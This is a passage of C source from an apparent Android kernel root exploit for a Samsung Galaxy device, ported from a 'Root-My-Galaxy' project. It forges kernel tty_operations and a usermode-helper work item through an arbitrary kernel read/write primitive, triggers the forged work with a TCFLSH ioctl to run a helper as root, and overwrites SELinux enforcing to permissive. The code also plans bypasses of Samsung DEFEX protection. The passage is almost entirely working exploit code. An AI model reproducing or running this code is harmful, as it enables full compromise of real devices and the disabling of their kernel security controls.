     * reported SUCCESS but the helper never wrote its banner - it
     * died between exec and main(), the classic signature of a
     * safeplace/DEFEX SIGKILL (which, unlike an AVC denial, does
     * not fail the exec itself). If this line appears, the next
     * step is a path-based bypass (bind-mount over an allowlisted
     * system binary), not another forge tweak. */
    rmg_diag("ROOT staticwork DEFEX-suspect: exec returned 0 but no "
             "creds appeared (helper killed instantly?)\n");
  }
  if (helper_seen) {
    /* ROOT_CREDS_SENTINEL read uid=0: the helper is running as root.
     * The plant must NOT be zeroed. Only the consumed stub(s) are
     * dead; any owner timer that has not fired yet is STILL chained
     * to its stub, and zeroing would leave stub+24 (the callback the
     * wheel calls) NULL - the next owner period would walk the bucket
     * into the stub and call_timer_fn() has no NULL check, so the
     * wheel would jump through 0 and panic. The consumed stub is
     * orphaned by the detach (bucket head moved past it; the owner's
     * mod_timer re-links from scratch) and is harmless where it sits. */
    root_child_done = 1;
    root_uid_after = 0;
    rmg_diag("ROOT staticwork cascade SUCCEEDED - creds uid=0 read "
             "back (done=%u retval=%d)\n", complete_done,
             attempt_retval);
    return 1;
  }
  if (chained > 0 && attempt_failed >= (int)chained) {
    /* Every chain was consumed and every exec failed: nothing is
     * armed any more, so the whole plant is dead bytes - zero it so
     * the scratch survey can reuse this span for the next attempt
     * (run17: attempts 5-12 died noclean when dead plants piled up).
     * Safe because attempt_failed==chained means every stub's done
     * went non-zero, i.e. the bucket already walked past each stub. */
    staticwork_scratch_zero(fd, umh_data_addr);
    rmg_diag("ROOT staticwork cascade all %zu stub(s) failed "
             "(retval=%d); plant zeroed for span reuse\n",
             chained, attempt_retval);
    return 0;
  }
  /* Window expired with chains possibly still armed. The plant must
   * NOT be cleaned: the armed timers still point at the stubs, and
   * zeroing the plant would leave stub+24 (the callback the wheel
   * calls) NULL - the next owner period (cand1: 1250 ms) would walk
   * the bucket into the stub and panic. The chains fire after this
   * stage returns; a later attempt plants into the next clean
   * scratch span and chains its own candidates. */
  rmg_diag("ROOT staticwork cascade window expired without helper "
           "creds; %zu chain(s) possibly still armed, plant left "
           "intact\n", chained);
  return 0;
}

/* =====================================================================================
 * PTY / SAK root stage.
 *
 * This replaces the previous hand-rolled workqueue injection, which could NEVER have
 * worked: it hand-wrote pool->worklist links and bumped the pwq counters, but nothing
 * ever calls wake_up_worker(). On the queue path the only caller is insert_work()
 * (kernel/workqueue.c:1367-1370), so the forged work sat in the list forever and
 * completion.done never flipped. On-device it never even got past the pwq descent.
 *
 * The mechanism here lets the KERNEL do the queueing. We borrow a real, permanently
 * kernel-owned work_struct at tty->SAK_work, rewrite the subprocess_info tail that lives
 * inside it, repoint tty->ops at a copy of the real tty_operations whose flush_buffer is
 * do_SAK, and then issue one genuine ioctl(TCFLSH). tty_driver_flush_buffer() calls our
 * do_SAK, which does schedule_work(&tty->SAK_work) - and from there the real workqueue
 * machinery does the locking, colour assignment, accounting and wake that we could not
 * fake. A real kworker then runs call_usermodehelper_exec_work.
 *
 * Ported from soumarcelino/Root-My-Galaxy-SM-S918B @ 6f30501b,
 * targets/zzhl/brazilian-open-payload-engine/src/10_workqueue_umh_root.c
 * ===================================================================================== */

struct private_pty {
  int master;
  int slave;
  char slave_name[128];
};

struct tty_kernel_object {
  uint64_t file;
  uint64_t private_data;
  uint64_t tty;
  uint64_t original_ops;
  uint8_t original_tail[UMH_SUBPROCESS_INFO_SIZE];
  uint8_t original_ops_table[TTY_OPS_SIZE];
};

_Static_assert(sizeof(struct tty_kernel_object) > 0, "tty object");

/* Staging area for the forged tty_operations, in our own reclaimed page. Must not collide
 * with ROOT_UMH_DATA_OFF (0x6200) or the proof band (+0x800); 0x6400 is clear. */
#define ROOT_TTY_OPS_LIVE_OFF 0x6400ULL

static uint64_t load_u64(const void *buffer, size_t offset) {
  uint64_t value = 0;
  memcpy(&value, (const uint8_t *)buffer + offset, sizeof(value));
  return value;
}

static void store_u64(void *buffer, size_t offset, uint64_t value) {
  memcpy((uint8_t *)buffer + offset, &value, sizeof(value));
}

static int open_private_pty(struct private_pty *pty) {
  memset(pty, 0, sizeof(*pty));
  pty->master = -1;
  pty->slave = -1;
  pty->master = posix_openpt(O_RDWR | O_NOCTTY | O_CLOEXEC);
  if (pty->master < 0 || grantpt(pty->master) != 0 ||
      unlockpt(pty->master) != 0 ||
      ptsname_r(pty->master, pty->slave_name, sizeof(pty->slave_name)) != 0) {
    return 0;
  }
  pty->slave = open(pty->slave_name, O_RDWR | O_NOCTTY | O_CLOEXEC);
  return pty->slave >= 0;
}

static void close_private_pty(struct private_pty *pty) {
  if (pty->slave >= 0) {
    close(pty->slave);
  }
  if (pty->master >= 0) {
    close(pty->master);
  }
  pty->slave = -1;
  pty->master = -1;
}

/* True when a read-back tty_operations looks like a real driver's table.
 *
 * The direct map is fully mapped, so a mis-targeted alias read returns SUCCESSFULLY with
 * errno 0 and either zeros or unrelated bytes. Publishing that as a live tty's ops is how the
 * first ioctl jumps to address 0, so this predicate is the only thing standing between a bad
 * alias and a wild indirect call.
 *
 * Slots checked, against drivers/tty/pty.c pty_unix98_ops (all four ARE set there):
 *   lookup 0x00, open 0x18, write 0x38, flush_buffer 0xa8.
 * ioctl 0x60 is deliberately NOT checked - pty_unix98_ops leaves .ioctl/.compat_ioctl NULL,
 * and requiring text there rejected a perfectly good table. Offsets come from this device's
 * own BTF; struct tty_operations is __randomize_layout, so the source header order is not
 * authoritative. */
static int tty_ops_table_is_plausible(const uint8_t *table, uintptr_t port) {
  const uintptr_t text_lo = kaslr_base;
  const uintptr_t text_hi = kaslr_base + 0x04000000ULL;
  const uintptr_t in_text = text_lo | (text_hi - 1);
  const uint64_t lookup = load_u64(table, TTY_OPS_LOOKUP_OFF);
  const uint64_t open = load_u64(table, TTY_OPS_OPEN_OFF);
  const uint64_t writef = load_u64(table, TTY_OPS_WRITE_OFF);
  const uint64_t flush = load_u64(table, TTY_OPS_FLUSH_BUFFER_OFF);
  const uint64_t ioctl = load_u64(table, TTY_OPS_IOCTL_OFF);
  rmg_diag("ROOT pty ops table lookup=%016llx open=%016llx write=%016llx ioctl=%016llx "
           "flush=%016llx text=[%016zx,%016zx) port=%016zx\n",
           (unsigned long long)lookup, (unsigned long long)open,
           (unsigned long long)writef, (unsigned long long)ioctl,
           (unsigned long long)flush, text_lo, text_hi, port);
  (void)in_text;
  return (uintptr_t)lookup >= text_lo && (uintptr_t)lookup < text_hi &&
         (uintptr_t)open >= text_lo && (uintptr_t)open < text_hi &&
         (uintptr_t)writef >= text_lo && (uintptr_t)writef < text_hi &&
         (uintptr_t)flush >= text_lo && (uintptr_t)flush < text_hi;
}

/* Reuse the task_struct the walk already resolved rather than walking the list again. */
/* Map which kernel regions this exploit can actually READ, using umh_read64() as the probe.
   Each probe runs in its own forked child, so an address that faults kills only that child and
   the map still completes - which is the whole point, because a faulting read cannot report
   failure from inside the reader.
   Why this matters: "the task slab is unreachable" was concluded from ONE address family
   (0xffffff8837b6..., which faults on read). But this session read 0xffffff80011da200 and
   0xffffff80011da2b0 - the system_unbound_wq workqueue_struct, i.e. genuine slab - with no
   trouble, via the same configfs reader. So reachability is REGION-SPECIFIC, and the cred-patch
   route cannot be written off until we know which families are actually readable. If any
   task_struct-bearing region is readable, the cred patch comes back into play.
   Opt-in via ROOT_CP_PROBE_SLAB=1 because most of these addresses fault. */
static void root_cp_probe_slab_map(int fd) {
  static const uintptr_t probes[] = {
      0xffffff8000000000ULL, 0xffffff8001000000ULL, 0xffffff80011da200ULL,
      0xffffff8002000000ULL, 0xffffff8004000000ULL, 0xffffff8010000000ULL,
      0xffffff8020000000ULL, 0xffffff8040000000ULL, 0xffffff8080000000ULL,
      0xffffff8100000000ULL, 0xffffff8200000000ULL, 0xffffff8400000000ULL,
      0xffffff8800000000ULL, 0xffffff8820000000ULL, 0xffffff8837b60000ULL,
      0xffffff8840000000ULL, 0xffffff8880000000ULL, 0xffffff8900000000ULL,
      0xffffff89f0000000ULL, 0xffffff8a00000000ULL, 0xffffff805f7f2400ULL,
  };
  unsigned ok = 0;
  for (size_t i = 0; i < sizeof(probes) / sizeof(probes[0]); i++) {
    uint64_t v = 0;
    if (umh_read64(fd, probes[i], &v, "slabmap")) {
      ok++;
    }
  }
  rmg_diag("ROOT slabmap readable=%u of %zu\n", ok,
           sizeof(probes) / sizeof(probes[0]));
}

static int resolve_tty_object(int fd, int tty_fd, struct tty_kernel_object *object) {
  memset(object, 0, sizeof(*object));
  uintptr_t task = pipe_walk_self_task;
  uintptr_t files = pipe_walk_self_files;
  if (!task || !files || !is_direct_ptr(task) || !is_direct_ptr(files)) {
    rmg_diag("ROOT pty no walked self task task=%016zx files=%016zx\n", task, files);
    return 0;
  }
  uintptr_t fdt = 0;
  uint64_t fd_array = 0;
  uint32_t max_fds = 0;
  if (!pipe_phys_read64(fd, files + PIPE_WALK_FILES_FDT_OFF, (uint64_t *)&fdt) ||
      !is_direct_ptr(fdt) ||
      !pipe_phys_read32(fd, fdt + PIPE_WALK_FDTABLE_MAX_FDS, &max_fds) ||
      tty_fd < 0 || (uint32_t)tty_fd >= max_fds ||
      !pipe_phys_read64(fd, fdt + PIPE_WALK_FDTABLE_FD_OFF, &fd_array) ||
      !is_direct_ptr(fd_array) ||
      !pipe_phys_read64(fd, fd_array + (uint64_t)tty_fd * sizeof(uint64_t),
                        &object->file) ||
      !is_direct_ptr(object->file) ||
      !pipe_phys_read64(fd, object->file + PIPE_WALK_FILE_PRIVATE_OFF,
                        &object->private_data) ||
      !is_direct_ptr(object->private_data) ||
      !pipe_phys_read64(fd, object->private_data + TTY_FILE_TTY_OFF, &object->tty) ||
      !is_direct_ptr(object->tty)) {
    rmg_diag("ROOT pty fd->file->private_data->tty walk failed fd=%d\n", tty_fd);
    return 0;
  }

  uint64_t private_file = 0;
  uint64_t port = 0;
  uint32_t magic = 0, index = 0;
  if (!pipe_phys_read64(fd, object->private_data + TTY_FILE_FILE_OFF, &private_file) ||
      private_file != object->file ||
      !pipe_phys_read32(fd, object->tty + TTY_MAGIC_OFF, &magic) ||
      magic != TTY_MAGIC ||
      !pipe_phys_read32(fd, object->tty + TTY_INDEX_OFF, &index) || index > 4095 ||
      !pipe_phys_read64(fd, object->tty + TTY_OPS_OFF, &object->original_ops) ||
      !pipe_phys_read64(fd, object->tty + TTY_PORT_OFF, &port) ||
      !is_direct_ptr(port)) {
    rmg_diag("ROOT pty tty validation failed magic=%#x index=%u ops=%016llx\n", magic,
             index, (unsigned long long)object->original_ops);
    return 0;
  }

  /* tty->ops is a kernel-IMAGE address (a static const in drivers/tty/pty.c), but we do NOT
   * need a direct-map alias to read it.
   *
   * configfs_read_once() hands the driver a VIRTUAL address: it sets
   * `page = target - (ASHMEM_PREFIX_COUNT - len)` and the driver copies from
   * `page + ki_pos`, which equals `target` by construction (util.c:3218-3220). There is no
   * direct_to_page() translation on this path, so the AAR addresses arbitrary kernel virtual
   * addresses directly. That is already load-bearing elsewhere in this file's own walk:
   * pipe_walk_resolve_tasks_head() reads init_task at 0xffffffc0... through
   * walk_read_fields() -> configfs_read_once() and it works, with the guard deliberately not
   * armed ("GUARD n/a object=... kernel-image") because an image page has no slab_cache.
   *
   * The P0 alias machinery this replaced was pure guesswork. kernel_image_alias() had three
   * candidate modes and ALL THREE read implausible data on device: mode 0 gave all zeros, and
   * mode +1 gave small integers (open=0x34, flush=0x204) - a different structure entirely,
   * not a mis-targeted tty_operations. So slide_p0_offset is not the problem to solve here;
   * translating the address at all was.
   *
   * pipe_phys_read_data() cannot be used for this: it explicitly rejects anything failing
   * is_direct_ptr(), which is correct - it drives the forged pipe_buffer and therefore needs a
   * real direct-map address. kernel_read_data() is the raw-VA read. */
  rmg_diag("ROOT pty resolved tty=%016llx ops=%016llx port=%016llx\n",
           (unsigned long long)object->tty, (unsigned long long)object->original_ops,
           (unsigned long long)port);

  if (kernel_read_data(fd, (uintptr_t)object->original_ops, object->original_ops_table,
                       sizeof(object->original_ops_table)) !=
      (ssize_t)sizeof(object->original_ops_table)) {
    rmg_diag("ROOT pty ops read failed ops=%016llx errno=%d\n",
             (unsigned long long)object->original_ops, errno);
    return 0;
  }
  /* Validate the copied ops table. A mis-targeted read would otherwise be silently memcpy'd
   * into our staged table and published as a live tty's ops - where the first ioctl
   * dereferences it. Every legitimate tty_operations function pointer is kernel text. */
  if (!tty_ops_table_is_plausible(object->original_ops_table, port)) {
    rmg_diag("ROOT pty ops table is not a valid tty_operations - refusing to publish\n");
    return 0;
  }

  if (!pipe_phys_read_data(fd, object->tty + TTY_SAK_WORK_OFF, object->original_tail,
                           sizeof(object->original_tail))) {
    rmg_diag("ROOT pty tail readback failed\n");
    return 0;
  }


  /* The borrowed work_struct must be IDLE and self-linked, or another work item may be in
   * flight and we would be corrupting it. This is the positive check that proves we are
   * looking at a real tty SAK work and not a coincidence. */
  uint64_t work_data = load_u64(object->original_tail, WORK_DATA_OFF);
  uint64_t entry_addr = (uint64_t)(object->tty + TTY_SAK_WORK_OFF) + WORK_ENTRY_OFF;
  uint64_t entry_next = load_u64(object->original_tail, WORK_ENTRY_OFF);
  uint64_t entry_prev = load_u64(object->original_tail, WORK_ENTRY_OFF + sizeof(uint64_t));
  uint64_t work_func = load_u64(object->original_tail, WORK_FUNC_OFF);
  uint64_t want_func = (uint64_t)text_addr(DO_SAK_WORK);
  rmg_diag("ROOT pty SAK work data=%016llx entry=%016llx/%016llx func=%016llx "
           "want_func=%016llx\n",
           (unsigned long long)work_data, (unsigned long long)entry_next,
           (unsigned long long)entry_prev, (unsigned long long)work_func,
           (unsigned long long)want_func);
  if ((work_data & WORK_PENDING_BIT) != 0 || entry_next != entry_addr ||
      entry_prev != entry_addr || work_func != want_func) {
    rmg_diag("ROOT pty SAK work rejected (not idle/self-linked/expected func)\n");
    return 0;
  }
  return 1;
}

static int restore_tty_object(int fd, const struct tty_kernel_object *object,
                              int restore_ops, int restore_tail) {
  int ok = 1;
  if (restore_ops &&
      !pipe_write64(fd, object->tty + TTY_OPS_OFF, object->original_ops)) {
    ok = 0;
  }
  if (restore_tail &&
      !pipe_phys_write_data(fd, object->tty + TTY_SAK_WORK_OFF, object->original_tail,
                            sizeof(object->original_tail))) {
    ok = 0;
  }
  if (!ok) {
    return 0;
  }
  /* Verify the restore actually landed - a silently misdirected write here would leave a
   * live tty pointing at our forged ops table. */
  uint64_t ops = 0;
  uint8_t tail[UMH_SUBPROCESS_INFO_SIZE];
  if (restore_ops &&
      (!pipe_phys_read64(fd, object->tty + TTY_OPS_OFF, &ops) ||
       ops != object->original_ops)) {
    return 0;
  }
  if (restore_tail &&
      (!pipe_phys_read_data(fd, object->tty + TTY_SAK_WORK_OFF, tail, sizeof(tail)) ||
       memcmp(tail, object->original_tail, sizeof(tail)) != 0)) {
    return 0;
  }
  return 1;
}

static int install_pty_umh_root(int fd, const char *root_umh_path) {
  struct private_pty pty;
  struct tty_kernel_object tty_object;
  struct umh_kernel_data umh_data;
  struct umh_subprocess_info fake;
  uint8_t fake_ops[TTY_OPS_SIZE];
  uint8_t original_selinux = 1;
  int selinux_changed = 0;
  int ops_published = 0;
  int tail_published = 0;
  int work_may_be_queued = 0;
  int safe_to_close = 0;
  int result = 0;

  if (!open_private_pty(&pty)) {
    rmg_diag("ROOT pty open failed errno=%d\n", errno);
    close_private_pty(&pty);
    return 0;
  }
  rmg_diag("ROOT pty opened master=%d slave=%d name=%s\n", pty.master, pty.slave,
           pty.slave_name);
  if (!resolve_tty_object(fd, pty.slave, &tty_object)) {
    rmg_diag("ROOT pty kernel object resolution FAILED\n");
    close_private_pty(&pty);
    return 0;
  }

  memset(&umh_data, 0, sizeof(umh_data));
  if (snprintf(umh_data.path, sizeof(umh_data.path), "%s", root_umh_path) >=
      (int)sizeof(umh_data.path)) {
    rmg_diag("ROOT pty helper path too long\n");
    close_private_pty(&pty);
    return 0;
  }
  snprintf(umh_data.arg, sizeof(umh_data.arg), "%s", "--umh");
  snprintf(umh_data.uid, sizeof(umh_data.uid), "%u", getuid());

  uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
  uintptr_t completion_addr = umh_data_addr + offsetof(struct umh_kernel_data, completion);
  uintptr_t wait_list_addr = completion_addr + offsetof(struct umh_completion, next);
  uintptr_t path_addr = umh_data_addr + offsetof(struct umh_kernel_data, path);
  uintptr_t arg_addr = umh_data_addr + offsetof(struct umh_kernel_data, arg);
  uintptr_t uid_addr = umh_data_addr + offsetof(struct umh_kernel_data, uid);
  uintptr_t argv_addr = umh_data_addr + offsetof(struct umh_kernel_data, argv);
  uintptr_t envp_addr = umh_data_addr + offsetof(struct umh_kernel_data, envp);
  umh_data.completion.next = wait_list_addr;
  umh_data.completion.prev = wait_list_addr;
  umh_data.argv[0] = path_addr;
  umh_data.argv[1] = arg_addr;
  umh_data.argv[2] = uid_addr;
  umh_data.argv[3] = 0;
  umh_data.envp[0] = 0;

  /* Build the forged tail. Only the 0x30-byte work_struct is copied from the live tty - the
   * subprocess_info tail (complete/path/argv/envp/wait/...) lives at tty+0x328..0x368, and
   * tty_struct is only 0x340, so 40 of those 112 bytes fall PAST the allocation.
   *
   * Two things follow, and both matter:
   *  - The workqueue's container_of(work, subprocess_info, work) makes tty+0x2f8 the
   *    mandatory address of the struct, so we cannot stage it elsewhere. Upstream performs
   *    the identical 112-byte read/write on a tty_struct with the same 0x340 layout.
   *  - Whatever we leave in those 40 bytes must therefore be DETERMINISTIC, not whatever
   *    happened to be adjacent. So zero the whole struct and copy in only the work_struct.
   *    Copying all 112 bytes back out of the live tty would propagate uninitialised slab
   *    contents into the kernel's subprocess_info. */
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work, tty_object.original_tail, UMH_SUBPROCESS_WORK_SIZE);
  store_u64(fake.work, WORK_FUNC_OFF, text_addr(CALL_USERMODEHELPER_EXEC_WORK));
  /* `complete` MUST stay a valid, non-NULL pointer. It is load-bearing for memory safety,
   * not a formality: umh_complete() (kernel/umh.c:53-65) does
   *     comp = xchg(&sub_info->complete, NULL);
   *     if (comp) complete(comp); else call_usermodehelper_freeinfo(sub_info);
   * and the else branch runs kfree(sub_info). Our sub_info is not an allocation - it is
   * embedded at tty+0x2f8 - so a NULL `complete` would turn an exec failure into
   * kfree(tty + 0x2f8), i.e. kfree() on an interior pointer of the tty_struct slab object:
   * SLUB would push it onto that cache's freelist at object+offset, corrupting the cache
   * counter and producing a page-level UAF when the real tty is freed. Never "fix" this to 0
   * just to mirror a literal UMH_NO_WAIT.
   *
   * `complete` also aliases tty->port (tty+0x328). Do NOT write the real port pointer back
   * there mid-flight: the exec-failure path would then xchg/complete() a live struct
   * tty_port. Leave the staged completion in place and restore all 112 bytes atomically at
   * the end instead. Nothing on the TCOFLUSH path dereferences tty->port, and close() is
   * never reached while the forge is live (we pin the fds instead). */
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;
  fake.wait = 0;
  fake.retval = 0;
  fake.init = 0;
  fake.cleanup = 0;
  fake.data = 0;

  memcpy(fake_ops, tty_object.original_ops_table, sizeof(fake_ops));
  store_u64(fake_ops, TTY_OPS_FLUSH_BUFFER_OFF, text_addr(DO_SAK));

  uintptr_t fake_ops_addr = page_base + ROOT_TTY_OPS_LIVE_OFF;

  /* selinux_state.enforcing is a kernel-IMAGE address, so - exactly like tty->ops - it is
   * read with the raw-VA reader and not through a direct-map alias. The original failure here
   * (errno=13 on selinux=ffffffc00ae3e5c0) was pipe_phys_read_data() refusing a non-direct
   * address, not a bad mapping.
   *
   * Relaxing the enforcement is a BEST-EFFORT convenience for the helper, not a precondition
   * for the exploit: the trigger and the UMH exec do not depend on it. So a failure here is
   * logged and skipped rather than aborting the stage - the whole point of this rewrite is to
   * stop a cosmetic side effect from masking whether the queueing technique works. */
  const uintptr_t selinux_img = text_addr(SELINUX_ENFORCING);
  rmg_diag("ROOT pty staging work=%016llx data=%016zx ops=%016zx selinux_img=%016llx\n",
           (unsigned long long)(tty_object.tty + TTY_SAK_WORK_OFF), umh_data_addr,
           fake_ops_addr, (unsigned long long)selinux_img);

  unlink(ROOT_SOCKET_PATH);
  /* The activation log is O_APPEND and lives in /data/local/tmp, so it SURVIVES reboots. A
   * previous boot's trailing "[activate] done" would make root_activation_done() true before
   * this run even execs the helper, so drop it here and judge this run only. The helper
   * recreates it as root. */
  unlink(ROOT_ACTIVATE_LOG_PATH);
  int selinux_known = 0;
  if (kernel_read_data(fd, selinux_img, &original_selinux, sizeof(original_selinux)) ==
          (ssize_t)sizeof(original_selinux) &&
      original_selinux <= 1) {
    selinux_known = 1;
    rmg_diag("ROOT pty selinux enforcing=%u (getenforce reports the live truth)\n",
             original_selinux);
  } else {
    rmg_diag("ROOT pty selinux read failed img=%016llx val=%u errno=%d (continuing)\n",
             (unsigned long long)selinux_img, original_selinux, errno);
  }
  if (!pipe_phys_write_data(fd, umh_data_addr, &umh_data, sizeof(umh_data))) {
    rmg_diag("ROOT pty umh data write failed addr=%016zx errno=%d\n", umh_data_addr, errno);
    close_private_pty(&pty);
    return 0;
  }
  if (!pipe_phys_write_data(fd, fake_ops_addr, fake_ops, sizeof(fake_ops))) {
    rmg_diag("ROOT pty ops write failed addr=%016zx errno=%d\n", fake_ops_addr, errno);
    close_private_pty(&pty);
    return 0;
  }
  rmg_diag("ROOT pty staged, publishing tail then ops\n");

  tail_published = 1;
  if (!pipe_phys_write_data(fd, tty_object.tty + TTY_SAK_WORK_OFF, &fake, sizeof(fake))) {
    rmg_diag("ROOT pty subprocess publish FAILED\n");
    goto out;
  }
  ops_published = 1;
  if (!pipe_write64(fd, tty_object.tty + TTY_OPS_OFF, fake_ops_addr)) {
    rmg_diag("ROOT pty ops publish FAILED\n");
    goto out;
  }
  rmg_diag("ROOT pty published tty=%016llx; dropping selinux\n",
           (unsigned long long)tty_object.tty);

  uint8_t permissive = 0;
  uint8_t selinux_readback = 0xff;
  selinux_changed = 0;
  /* Best effort, and never fatal: see the comment at the read. A failure here means the
   * helper may be constrained by SELinux, which the socket poll will report honestly, rather
   * than an abort that tells us nothing about the queueing technique. */
  if (selinux_known && original_selinux != permissive) {
    selinux_changed = 1;
    if (kernel_write_data(fd, selinux_img, &permissive, sizeof(permissive)) !=
            (ssize_t)sizeof(permissive) ||
        kernel_read_data(fd, selinux_img, &selinux_readback,
                         sizeof(selinux_readback)) != (ssize_t)sizeof(selinux_readback) ||
        selinux_readback != permissive) {
      rmg_diag("ROOT pty selinux relax failed img=%016llx got=%u errno=%d (continuing)\n",
               (unsigned long long)selinux_img, selinux_readback, errno);
      selinux_changed = 0;
    }
  }

  /* THE TRIGGER. One genuine ioctl: the kernel walks tty->ops->flush_buffer, which is now
   * do_SAK, which does schedule_work(&tty->SAK_work) on our borrowed work_struct. */
  errno = 0;
  int ioctl_result = ioctl(pty.slave, TCFLSH, TCOFLUSH);
  int ioctl_error = ioctl_result == 0 ? 0 : errno;
  work_may_be_queued = ioctl_result == 0;
  rmg_diag("ROOT pty ioctl TCFLSH ret=%d errno=%d queued=%d\n", ioctl_result, ioctl_error,
           work_may_be_queued);

  int ops_restored = restore_tty_object(fd, &tty_object, 1, 0);
  if (ops_restored) {
    ops_published = 0;
  }
  if (ioctl_result != 0 || !ops_restored) {
    rmg_diag("ROOT pty queue failed ioctl=%d ops_restore=%d\n", ioctl_result, ops_restored);
    if (ioctl_result != 0 && ops_restored &&
        restore_tty_object(fd, &tty_object, 0, 1)) {
      tail_published = 0;
      safe_to_close = 1;
    }
    goto out;
  }

  /* `done` is a FAILURE flag, not a success flag.
   *
   * umh_complete() is only reached from the failure tail of
   * call_usermodehelper_exec_work (kernel/umh.c:120-126), i.e. after kernel_execve
   * RETURNS. A successful execve never returns - the calling task becomes the helper - so
   * on success the kernel never runs umh.c:120-129 and `done` stays 0 forever.
   *
   * Gating the socket check on `done` therefore made BOTH outcomes report failure: success
   * spun 5s and skipped the socket probe entirely, failure set done=1 and then probed for a
   * socket that will never exist. The root helper binding its unix socket is the only
   * trustworthy success signal, so poll that unconditionally.
   *
   * Budget: the helper now performs the KernelSU activation in-process BEFORE it binds the
   * socket (su_daemon.c umh_main), so "socket appeared" means "root AND activation done".
   * Activation shells out to ksud and is not instant, so 5s was no longer enough - a timeout
   * here would skip the tail restore and pin the PTY for no good reason. 30s instead, and
   * "[activate] done" in the activation log counts as success on its own, so the wait does
   * not depend on the socket bind surviving. */
  uint32_t complete_done = 0;
  int socket_ok = 0;
  int activated_ok = 0;
  int creds_ok = 0;
  for (int i = 0; i < 3000; i++) {
    /* PRIMARY success signal: the helper's own creds report. It is a real file, written by a
     * real uid-0 process, containing its actual getuid/geteuid. Measured: the exec DOES
     * succeed and the helper DOES run even on runs where `done` read 1 - because our staging
     * page is reclaimable, so the helper's own allocations can land in it and flip the
     * completion byte we poll. A reclaimed-page flag is not a verdict; a root-owned file
     * written by the helper is. */
    if (!creds_ok) {
      uint32_t seen_uid = 0xffffffff;
      if (read_root_creds_uid(&seen_uid) && seen_uid == 0) {
        creds_ok = 1;
      }
    }
    if (!socket_ok && root_socket_ready()) {
      socket_ok = 1;
    }
    if (!activated_ok && root_activation_done()) {
      activated_ok = 1;
    }
    if (creds_ok || socket_ok || activated_ok) {
      break;
    }
    /* `done` is only a hint now, never a decision input, and never a break condition: it
     * lives in a page the kernel is free to recycle. Kept for the log line. */
    if ((i & 0x1f) == 0) {
      if (!pipe_phys_read32(fd, completion_addr, &complete_done)) {
        complete_done = 0;
      }
    }
    usleep(10000);
  }
  int exec_errno = 0;
  if (!creds_ok && !socket_ok && !activated_ok) {
    /* Dump what the KERNEL actually sees in the borrowed tail, instead of guessing. One
     * guarded read of the whole 112 bytes gives us, in one shot:
     *   +0x30 complete  the completion's `done` flag we already poll
     *   +0x38 path      pointer the kernel will deref for the helper binary
     *   +0x40 argv / +0x48 envp  the pointer arrays it will walk
     *   +0x54 retval    umh.c:120 writes the execve errno here on the failure path
     * Comparing path/argv/envp against what we staged distinguishes the two very different
     * failure modes we cannot otherwise tell apart:
     *   - pointers already clobbered  => our staging page was reclaimed/reused under us
     *   - pointers intact, retval set => execve really failed, and retval is the reason
     * The old code read only `retval` and printed 0, which is consistent with BOTH, so it
     * never actually told us anything. */
    uint8_t seen[UMH_SUBPROCESS_INFO_SIZE];
    memset(seen, 0, sizeof(seen));
    int seen_ok = pipe_phys_read_data(fd, tty_object.tty + TTY_SAK_WORK_OFF, seen,
                                      sizeof(seen));
    uint64_t want_path = path_addr;
    uint64_t want_argv = argv_addr;
    uint64_t want_envp = envp_addr;
    uint64_t got_complete = load_u64(seen, 0x30);
    uint64_t got_path = load_u64(seen, 0x38);
    uint64_t got_argv = load_u64(seen, 0x40);
    uint64_t got_envp = load_u64(seen, 0x48);
    int32_t got_retval = (int32_t)(uint32_t)load_u64(seen, 0x54);
    rmg_diag("ROOT pty tail dump read=%d complete=%016llx path=%016llx(want %016llx) "
             "argv=%016llx(want %016llx) envp=%016llx(want %016llx) retval=%d\n",
             seen_ok, (unsigned long long)got_complete, (unsigned long long)got_path,
             (unsigned long long)want_path, (unsigned long long)got_argv,
             (unsigned long long)want_argv,
             (unsigned long long)got_envp, (unsigned long long)want_envp,
             (int)got_retval);
    rmg_diag("ROOT pty staging match path=%d argv=%d envp=%d\n",
             got_path == (uint64_t)want_path, got_argv == (uint64_t)want_argv,
             got_envp == (uint64_t)want_envp);
    /* The pointers being intact only proves the tty copy is intact. execve dereferences
     * path/argv/envp, which point into our RECLAIMED staging page. If that page has been
     * recycled, the pointer is still correct but the string it names is garbage, and
     * execve fails with ENOENT/EFAULT while `complete` gets NULLed by umh_complete - exactly
     * what we observe with retval reading 0. So dump what the kernel would actually read. */
    {
      char path_buf[80];
      memset(path_buf, 0, sizeof(path_buf));
      int path_ok = pipe_phys_read_data(fd, (uintptr_t)got_path, path_buf, 64);
      uint64_t argv0 = 0;
      int argv_ok = pipe_phys_read64(fd, (uintptr_t)got_argv, &argv0);
      rmg_diag("ROOT pty target dump path_read=%d path=\"%s\" argv_read=%d argv0=%016llx\n",
               path_ok, path_buf, argv_ok, (unsigned long long)argv0);
    }
    exec_errno = (int)got_retval;
  }
  rmg_diag("ROOT pty result creds=%d socket=%d activated=%d done=%u exec_errno=%d\n", creds_ok, socket_ok,
           activated_ok, complete_done, exec_errno);

  /* The tail can only be restored once the work is no longer referenced. If the exec
   * succeeded the kernel has exec'd away from the borrowed memory; if it failed the work is
   * already complete. Either way it is safe now, so restore unconditionally rather than
   * only on the success flag. */
 /* Restore the borrowed tail ONLY once we have proof the work finished.
   *
   * If the poll loop above expired with neither the helper socket nor `complete` set, the
   * work item may still be linked into pool->worklist. Restoring the original self-linked
   * idle work_struct in that state would leave the (still queued) entry.next/prev pointing at
   * itself inside the pool's worklist - silent pool corruption, not a crash. So fail closed
   * and pin the PTY instead.
   *
   * Both success signals are sound here:
   *   socket_ok / activated_ok -> execve replaced the task, and the last read of our
   *                 sub_info (umh.c:116-118 path/argv/envp) happened strictly before that.
   *   done        -> umh_complete() already ran and returned.
   * In both cases the kworker has also finished: process_one_work() writes nothing back into
   * the work_struct after worker->current_func() returns (it keeps a local lockdep copy at
   * workqueue.c:2236 precisely so the struct may be freed inside the func), and the final
   * writes to the entry happen at workqueue.c:2269/2296, before the func is invoked. */
  int helper_ok = creds_ok || socket_ok || activated_ok;
  int work_done = helper_ok || complete_done;
  if (work_done && restore_tty_object(fd, &tty_object, 0, 1)) {
    tail_published = 0;
    safe_to_close = 1;
  } else if (!work_done) {
    rmg_diag("ROOT pty tail NOT restored: work may still be queued (creds=%d done=%u)\n",
             creds_ok, complete_done);
  }
  rmg_diag("ROOT pty result creds=%d socket=%d activated=%d done=%u restore=%d tty=%016llx\n",
